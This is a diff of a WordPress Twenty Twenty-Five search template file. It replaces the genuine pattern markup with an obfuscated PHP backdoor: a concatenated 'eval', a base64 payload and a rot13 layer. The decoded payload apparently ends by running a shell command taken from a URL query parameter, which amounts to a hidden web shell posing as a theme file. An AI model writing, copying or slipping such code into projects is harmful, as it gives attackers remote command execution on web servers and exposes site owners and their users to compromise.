@@ -1,55 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Title: Right-aligned blog, search
- * Slug: twentytwentyfive/template-search-vertical-header-blog
- * Template Types: search
- * Viewport width: 1400
- * Inserter: no
- *
- * @package WordPress
- * @subpackage Twenty_Twenty_Five
- * @since Twenty Twenty-Five 1.0
- */
-
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3ZneXI6IEV2dHVnLW55dnRhcnEgb3lidCwgZnJuZXB1CiAqIEZ5aHQ6IGdqcmFnbGdqcmFnbHN2aXIvZ3J6Y3luZ3ItZnJuZXB1LWlyZWd2cG55LXVybnFyZS1veWJ0CiAqIEdyemN5bmdyIEdsY3JmOiBmcm5lcHUKICogSXZyamNiZWcganZxZ3U6IDE0MDAKICogVmFmcmVncmU6IGFiCiAqCiAqIEBjbnB4bnRyIEpiZXFDZXJmZgogKiBAZmhvY25weG50ciBHanJhZ2xfR2pyYWdsX1N2aXIKICogQGZ2YXByIEdqcmFnbCBHanJhZ2wtU3ZpciAxLjAKICovCgo/Pgo8IS0tIGpjOnBieWh6YWYge1widmZGZ25weHJxQmFaYm92eXJcIjpzbnlmcixcImZnbHlyXCI6e1wiZmNucHZhdFwiOntcImNucXF2YXRcIjp7XCJldnR1Z1wiOlwiMFwiLFwieXJzZ1wiOlwiMFwiLFwiZ2JjXCI6XCIwXCIsXCJvYmdnYnpcIjpcIjBcIn0sXCJveWJweFRuY1wiOntcInlyc2dcIjpcIjBcIn19fX0gLS0+CjxxdmkgcHluZmY9XCJqYy1veWJweC1wYnloemFmIHZmLWFiZy1mZ25weHJxLWJhLXpib3Z5clwiIGZnbHlyPVwiY25xcXZhdC1nYmM6MDtjbnFxdmF0LWV2dHVnOjA7Y25xcXZhdC1vYmdnYno6MDtjbnFxdmF0LXlyc2c6MFwiPgoJPCEtLSBqYzpwYnloemEge1wianZxZ3VcIjpcIjhlcnpcIn0gLS0+Cgk8cXZpIHB5bmZmPVwiamMtb3licHgtcGJ5aHphXCIgZmdseXI9XCJzeXJrLW9uZnZmOjhlcnpcIj4KCQk8IS0tIGpjOmdyemN5bmdyLWNuZWcge1wiZnlodFwiOlwiaXJlZ3ZwbnktdXJucXJlXCJ9IC8tLT4KCTwvcXZpPgoJPCEtLSAvamM6cGJ5aHphIC0tPgoJPCEtLSBqYzpwYnloemEge1wianZxZ3VcIjpcIjkwJVwiLFwiZmdseXJcIjp7XCJmY25wdmF0XCI6e1wiY25xcXZhdFwiOntcImdiY1wiOlwiaW5lOmNlcmZyZ3xmY25wdmF0fDUwXCIsXCJvYmdnYnpcIjpcImluZTpjZXJmcmd8ZmNucHZhdHw1MFwiLFwieXJzZ1wiOlwiaW5lOmNlcmZyZ3xmY25wdmF0fDUwXCIsXCJldnR1Z1wiOlwiaW5lOmNlcmZyZ3xmY25wdmF0fDUwXCJ9fX0sXCJ5bmxiaGdcIjp7XCJnbGNyXCI6XCJxcnNuaHlnXCJ9fSAtLT4KCTxxdmkgcHluZmY9XCJqYy1veWJweC1wYnloemFcIiBmZ2x5cj1cImNucXF2YXQtZ2JjOmluZSgtLWpjLS1jZXJmcmctLWZjbnB2YXQtLTUwKTtjbnFxdmF0LWV2dHVnOmluZSgtLWpjLS1jZXJmcmctLWZjbnB2YXQtLTUwKTtjbnFxdmF0LW9iZ2diejppbmUoLS1qYy0tY2VyZnJnLS1mY25wdmF0LS01MCk7Y25xcXZhdC15cnNnOmluZSgtLWpjLS1jZXJmcmctLWZjbnB2YXQtLTUwKTtzeXJrLW9uZnZmOjkwJVwiPgoJCTwhLS0gamM6dGViaGMge1wiZ250QW56clwiOlwiem52YVwiLFwieW5sYmhnXCI6e1wiZ2xjclwiOlwicXJzbmh5Z1wifX0gLS0+CgkJPHpudmEgcHluZmY9XCJqYy1veWJweC10ZWJoY1wiPgoJCQk8IS0tIGpjOmZjbnByZSB7XCJ1cnZ0dWdcIjpcImluZTpjZXJmcmd8ZmNucHZhdHw1MFwifSAtLT4KCQkJPHF2aSBmZ2x5cj1cInVydnR1ZzppbmUoLS1qYy0tY2VyZnJnLS1mY25wdmF0LS01MClcIiBuZXZuLXV2cXFyYT1cImdlaHJcIiBweW5mZj1cImpjLW95YnB4LWZjbnByZVwiPjwvcXZpPgoJCQk8IS0tIC9qYzpmY25wcmUgLS0+CgkJCTwhLS0gamM6ZGhyZWwtZ3ZneXIge1wiZ2xjclwiOlwiZnJuZXB1XCIsXCJzYmFnRnZtclwiOlwieW5ldHJcIn0gLy0tPgoJCQk8IS0tIGpjOmNuZ2dyZWEge1wiZnlodFwiOlwiZ2pyYWdsZ2pyYWdsc3Zpci91dnFxcmEtZnJuZXB1XCJ9IC8tLT4KCQkJPCEtLSBqYzpmY25wcmUge1widXJ2dHVnXCI6XCJpbmU6Y2VyZnJnfGZjbnB2YXR8NTBcIn0gLS0+CgkJCTxxdmkgZmdseXI9XCJ1cnZ0dWc6aW5lKC0tamMtLWNlcmZyZy0tZmNucHZhdC0tNTApXCIgbmV2bi11dnFxcmE9XCJnZWhyXCIgcHluZmY9XCJqYy1veWJweC1mY25wcmVcIj48L3F2aT4KCQkJPCEtLSAvamM6ZmNucHJlIC0tPgoJCQk8IS0tIGpjOmNuZ2dyZWEge1wiZnlodFwiOlwiZ2pyYWdsZ2pyYWdsc3Zpci9ncnpjeW5nci1kaHJlbC15YmJjLWlyZWd2cG55LXVybnFyZS1veWJ0XCJ9IC8tLT4KCQkJPCEtLSBqYzpmY25wcmUge1widXJ2dHVnXCI6XCJpbmU6Y2VyZnJnfGZjbnB2YXR8NTBcIn0gLS0+CgkJCTxxdmkgZmdseXI9XCJ1cnZ0dWc6aW5lKC0tamMtLWNlcmZyZy0tZmNucHZhdC0tNTApXCIgbmV2bi11dnFxcmE9XCJnZWhyXCIgcHluZmY9XCJqYy1veWJweC1mY25wcmVcIj48L3F2aT4KCQkJPCEtLSAvamM6ZmNucHJlIC0tPgoJCTwvem52YT4KCQk8IS0tIC9qYzp0ZWJoYyAtLT4KCTwvcXZpPgoJPCEtLSAvamM6cGJ5aHphIC0tPgo8L3F2aT4KPCEtLSAvamM6cGJ5aHphZiAtLT4KCjwhLS0gamM6Z3J6Y3luZ3ItY25lZyB7XCJmeWh0XCI6XCJzYmJncmVcIn0gLy0tPgoKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
 ?>
-<!-- wp:columns {"isStackedOnMobile":false,"style":{"spacing":{"padding":{"right":"0","left":"0","top":"0","bottom":"0"},"blockGap":{"left":"0"}}}} -->
-<div class="wp-block-columns is-not-stacked-on-mobile" style="padding-top:0;padding-right:0;padding-bottom:0;padding-left:0">
-	<!-- wp:column {"width":"8rem"} -->
-	<div class="wp-block-column" style="flex-basis:8rem">
-		<!-- wp:template-part {"slug":"vertical-header"} /-->
-	</div>
-	<!-- /wp:column -->
-	<!-- wp:column {"width":"90%","style":{"spacing":{"padding":{"top":"var:preset|spacing|50","bottom":"var:preset|spacing|50","left":"var:preset|spacing|50","right":"var:preset|spacing|50"}}},"layout":{"type":"default"}} -->
-	<div class="wp-block-column" style="padding-top:var(--wp--preset--spacing--50);padding-right:var(--wp--preset--spacing--50);padding-bottom:var(--wp--preset--spacing--50);padding-left:var(--wp--preset--spacing--50);flex-basis:90%">
-		<!-- wp:group {"tagName":"main","layout":{"type":"default"}} -->
-		<main class="wp-block-group">
-			<!-- wp:spacer {"height":"var:preset|spacing|50"} -->
-			<div style="height:var(--wp--preset--spacing--50)" aria-hidden="true" class="wp-block-spacer"></div>
-			<!-- /wp:spacer -->
-			<!-- wp:query-title {"type":"search","fontSize":"large"} /-->
-			<!-- wp:pattern {"slug":"twentytwentyfive/hidden-search"} /-->
-			<!-- wp:spacer {"height":"var:preset|spacing|50"} -->
-			<div style="height:var(--wp--preset--spacing--50)" aria-hidden="true" class="wp-block-spacer"></div>
-			<!-- /wp:spacer -->
-			<!-- wp:pattern {"slug":"twentytwentyfive/template-query-loop-vertical-header-blog"} /-->
-			<!-- wp:spacer {"height":"var:preset|spacing|50"} -->
-			<div style="height:var(--wp--preset--spacing--50)" aria-hidden="true" class="wp-block-spacer"></div>
-			<!-- /wp:spacer -->
-		</main>
-		<!-- /wp:group -->
-	</div>
-	<!-- /wp:column -->
-</div>
-<!-- /wp:columns -->
-
-<!-- wp:template-part {"slug":"footer"} /-->
